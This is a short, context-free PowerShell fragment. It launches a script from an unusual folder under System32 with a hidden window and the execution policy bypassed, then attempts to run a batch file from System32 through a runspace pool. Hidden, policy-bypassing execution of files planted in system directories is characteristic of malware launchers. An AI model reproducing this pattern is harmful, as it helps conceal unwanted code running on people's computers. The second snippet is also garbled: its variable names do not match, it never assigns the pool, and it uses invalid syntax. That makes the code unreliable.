powershell -w h -Exec Bypass C:\Windows\System32\rr\rr.ps1

$NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::(C:\Windows\System32\fb.bat);;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke()
